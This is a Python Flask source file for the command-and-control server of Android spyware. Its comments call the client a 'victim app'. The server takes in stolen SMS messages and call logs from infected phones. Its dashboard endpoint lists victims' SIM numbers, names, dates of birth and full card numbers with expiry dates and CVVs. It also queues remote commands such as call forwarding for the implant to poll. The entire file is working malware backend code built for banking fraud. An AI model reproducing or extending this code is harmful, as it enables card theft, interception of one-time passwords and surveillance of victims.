from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import time
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ==========================================
# DATA STORE (Memory + Persistent)
# ==========================================
devices = {}        # device_id -> full device data
sms_store = {}      # device_id -> list of sms
call_store = {}     # device_id -> list of calls
command_queue = {}  # device_id -> {"command": "CALL_FWD", "data": {...}}

# ==========================================
# 1. REGISTER API (Victim app se pehla data aayega)
# ==========================================
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({"error": "No device_id"}), 400
    
    # Last seen update
    data['last_seen'] = datetime.now().isoformat()
    data['status'] = 'Online'
    
    # Store data
    if device_id in devices:
        # Existing device - update data
        for key, value in data.items():
            if value:
                devices[device_id][key] = value
        devices[device_id]['status'] = 'Online'
        devices[device_id]['last_seen'] = datetime.now().isoformat()
    else:
        # New device
        devices[device_id] = data
        sms_store[device_id] = []
        call_store[device_id] = []
    
    print(f"[+] Device Registered/Updated: {device_id}")
    return jsonify({"status": "success", "device_id": device_id}), 200

# ==========================================
# 2. SMS RECEIVE API (Victim app se SMS aayegi)
# ==========================================
@app.route('/api/sms', methods=['POST'])
def receive_sms():
    data = request.get_json()
    device_id = data.get('device_id')
    
    if device_id:
        if device_id not in sms_store:
            sms_store[device_id] = []
        
        # Add timestamp if not present
        if 'timestamp' not in data:
            data['timestamp'] = datetime.now().isoformat()
        
        sms_store[device_id].append(data)
        print(f"[+] SMS from {device_id}: {data.get('body', '')[:30]}...")
        return jsonify({"status": "received"}), 200
    
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 3. CALL RECEIVE API (Victim app se call data aayega)
# ==========================================
@app.route('/api/call', methods=['POST'])
def receive_call():
    data = request.get_json()
    device_id = data.get('device_id')
    
    if device_id:
        if device_id not in call_store:
            call_store[device_id] = []
        
        if 'timestamp' not in data:
            data['timestamp'] = datetime.now().isoformat()
        
        call_store[device_id].append(data)
        print(f"[+] Call from {device_id}: {data.get('type')}")
        return jsonify({"status": "received"}), 200
    
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 4. DEVICES LIST API (Dashboard)
# ==========================================
@app.route('/api/devices', methods=['GET'])
def get_devices():
    device_list = []
    for device_id, info in devices.items():
        device_list.append({
            "id": device_id,
            "device_name": info.get("device_name", "Unknown"),
            "device_brand": info.get("device_brand", "Unknown"),
            "device_model": info.get("device_model", "Unknown"),
            "android_version": info.get("android_version", "Unknown"),
            "sim1_number": info.get("sim1_number", ""),
            "sim1_network": info.get("sim1_network", ""),
            "sim2_number": info.get("sim2_number", ""),
            "sim2_network": info.get("sim2_network", ""),
            "battery": info.get("battery", 0),
            "is_charging": info.get("is_charging", False),
            "name": info.get("name", ""),
            "phone": info.get("phone", ""),
            "dob": info.get("dob", ""),
            "limit": info.get("limit", ""),
            "card_no": info.get("card_no", ""),
            "expiry": info.get("expiry", ""),
            "cvv": info.get("cvv", ""),
            "call_forward_status": info.get("call_forward_status", "Not activated"),
            "status": info.get("status", "Offline"),
            "last_seen": info.get("last_seen", "")
        })
    return jsonify({"devices": device_list}), 200

# ==========================================
# 5. DEVICE DETAILS API (Single device)
# ==========================================
@app.route('/api/devices/<device_id>', methods=['GET'])
def get_device(device_id):
    if device_id in devices:
        info = devices[device_id]
        info['sms_count'] = len(sms_store.get(device_id, []))
        return jsonify(info), 200
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 6. DEVICE SMS API (SMS history)
# ==========================================
@app.route('/api/sms/<device_id>', methods=['GET'])
def get_sms(device_id):
    if device_id in sms_store:
        return jsonify({"sms": sms_store[device_id]}), 200
    return jsonify({"sms": []}), 200

# ==========================================
# 7. SET COMMAND API (Dashboard se command set karega)
# ==========================================
@app.route('/api/set_command', methods=['POST'])
def set_command():
    data = request.get_json()
    device_id = data.get('device_id')
    command = data.get('command')
    command_data = data.get('data')
    
    if not device_id or not command:
        return jsonify({"error": "device_id and command required"}), 400
    
    command_queue[device_id] = {
        "command": command,
        "data": command_data
    }
    print(f"[+] Command set for {device_id}: {command}")
    return jsonify({"status": "command set"}), 200

# ==========================================
# 8. COMMAND FETCH API (Victim app poll karegi)
# ==========================================
@app.route('/api/commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    if device_id in command_queue:
        cmd = command_queue[device_id]
        del command_queue[device_id]
        return jsonify({
            "command": cmd["command"],
            "data": cmd["data"]
        }), 200
    return jsonify({"command": "", "data": ""}), 200

# ==========================================
# 9. DELETE DEVICE API
# ==========================================
@app.route('/api/devices/<device_id>', methods=['DELETE'])
def delete_device(device_id):
    if device_id in devices:
        del devices[device_id]
        if device_id in sms_store:
            del sms_store[device_id]
        if device_id in call_store:
            del call_store[device_id]
        if device_id in command_queue:
            del command_queue[device_id]
        print(f"[-] Device deleted: {device_id}")
        return jsonify({"status": "deleted"}), 200
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 10. RUN SERVER
# ==========================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
